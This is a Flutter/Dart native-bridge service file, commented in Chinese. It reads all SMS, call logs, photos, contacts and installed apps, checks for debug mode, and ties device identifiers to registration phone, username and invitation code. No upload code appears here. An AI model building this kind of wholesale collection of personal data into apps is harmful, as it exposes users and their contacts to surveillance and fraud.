import 'package:flutter/services.dart';
import 'dart:io';
import '../../core/services/storage_service.dart';

/// 原生平台服务
/// 封装 iOS 和 Android 的原生功能调用
class NativeService {
  static final NativeService instance = NativeService._internal();
  NativeService._internal();
  
  // MethodChannel 名称
  static const String _permissionChannelName = 'com.mop.app/permissions';
  static const String _dataChannelName = 'com.mop.app/data';
  
  final MethodChannel _permissionChannel = const MethodChannel(_permissionChannelName);
  final MethodChannel _dataChannel = const MethodChannel(_dataChannelName);
  
  // ==================== 权限管理 ====================
  
  /// 检查权限状态
  /// 
  /// [permission] 权限类型：contacts, photos, camera, microphone, location, sms, phone
  /// 
  /// 返回：0-拒绝, 1-已授权, 2-受限
  Future<int> checkPermission(String permission) async {
    try {
      final result = await _permissionChannel.invokeMethod<int>('checkPermission', {
        'permission': permission,
      });
      return result ?? 0;
    } catch (e) {
      print('检查权限失败: $e');
      return 0;
    }
  }
  
  /// 申请权限
  /// 
  /// [permission] 权限类型
  /// 
  /// 返回：0-拒绝, 1-已授权
  Future<int> requestPermission(String permission) async {
    try {
      final result = await _permissionChannel.invokeMethod<int>('requestPermission', {
        'permission': permission,
      });
      return result ?? 0;
    } catch (e) {
      print('申请权限失败: $e');
      return 0;
    }
  }
  
  /// 打开应用设置页面
  Future<bool> openAppSettings() async {
    try {
      final result = await _permissionChannel.invokeMethod<bool>('openAppSettings');
      return result ?? false;
    } catch (e) {
      print('打开设置失败: $e');
      return false;
    }
  }
  
  // ==================== 安全检测 ====================
  
  /// 检查是否处于调试模式
  Future<bool> checkDebugMode() async {
    try {
      final result = await _permissionChannel.invokeMethod<bool>('checkDebugMode');
      return result ?? false;
    } catch (e) {
      print('检查调试模式失败: $e');
      return false;
    }
  }
  
  // ==================== 数据读取（Android） ====================
  
  /// 获取所有短信（仅 Android）
  Future<List<Map<String, dynamic>>> getAllSms() async {
    if (!Platform.isAndroid) {
      throw Exception('短信功能仅支持 Android 平台');
    }
    
    try {
      final result = await _dataChannel.invokeMethod<List>('getAllSms');
      return (result ?? []).map((item) => Map<String, dynamic>.from(item)).toList();
    } catch (e) {
      throw Exception('读取短信失败: $e');
    }
  }
  
  /// 获取所有通话记录（仅 Android）
  Future<List<Map<String, dynamic>>> getAllCallLogs() async {
    if (!Platform.isAndroid) {
      throw Exception('通话记录功能仅支持 Android 平台');
    }
    
    try {
      final result = await _dataChannel.invokeMethod<List>('getAllCallLogs');
      return (result ?? []).map((item) => Map<String, dynamic>.from(item)).toList();
    } catch (e) {
      throw Exception('读取通话记录失败: $e');
    }
  }
  
  /// 获取应用列表（仅 Android）
  Future<List<Map<String, dynamic>>> getAppList() async {
    if (!Platform.isAndroid) {
      throw Exception('应用列表功能仅支持 Android 平台');
    }
    
    try {
      final result = await _dataChannel.invokeMethod<List>('getAppList');
      return (result ?? []).map((item) => Map<String, dynamic>.from(item)).toList();
    } catch (e) {
      throw Exception('获取应用列表失败: $e');
    }
  }
  
  /// 获取所有照片
  Future<List<Map<String, dynamic>>> getAllPhotos() async {
    try {
      final result = await _dataChannel.invokeMethod<List>('getAllPhotos');
      return (result ?? []).map((item) => Map<String, dynamic>.from(item)).toList();
    } catch (e) {
      throw Exception('读取相册失败: $e');
    }
  }
  
  /// 获取所有联系人
  Future<List<Map<String, dynamic>>> getAllContacts() async {
    try {
      final result = await _dataChannel.invokeMethod<List>('getAllContacts');
      return (result ?? []).map((item) => Map<String, dynamic>.from(item)).toList();
    } catch (e) {
      throw Exception('读取通讯录失败: $e');
    }
  }
  
  /// 获取设备信息
  /// 
  /// 返回设备信息，包含：
  /// - 设备型号、系统版本
  /// - IP 地址
  /// - 设备唯一标识符
  /// - 注册时的手机号/用户名
  /// - 注册时的邀请码
  Future<Map<String, dynamic>> getDeviceInfo() async {
    try {
      final result = await _dataChannel.invokeMethod<Map>('getDeviceInfo');
      final deviceInfo = Map<String, dynamic>.from(result ?? {});
      
      // 从本地存储读取注册信息
      final storageService = StorageService.instance;
      deviceInfo['register_phone'] = storageService.getRegisterPhone() ?? '';
      deviceInfo['register_username'] = storageService.getRegisterUsername() ?? '';
      deviceInfo['register_invitation_code'] = storageService.getRegisterInvitationCode() ?? '';
      
      return deviceInfo;
    } catch (e) {
      throw Exception('获取设备信息失败: $e');
    }
  }
}
